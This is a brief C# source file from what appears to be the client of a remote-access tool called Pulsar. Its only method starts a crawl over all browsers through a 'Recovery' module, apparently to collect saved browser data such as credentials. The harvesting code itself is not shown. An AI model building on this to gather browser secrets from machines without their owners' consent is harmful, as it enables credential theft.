using Pulsar.Client.Recovery.Browsers;
using System.Collections.Generic;

namespace Pulsar.Client.Recovery.Crawler
{
    public static class Crawl
    {
        public static List<AllBrowsers> Start()
        {
            var found = new List<AllBrowsers>();
            found.Add(BrowserCrawler.CrawlAll());
            return found;
        }
    }
}
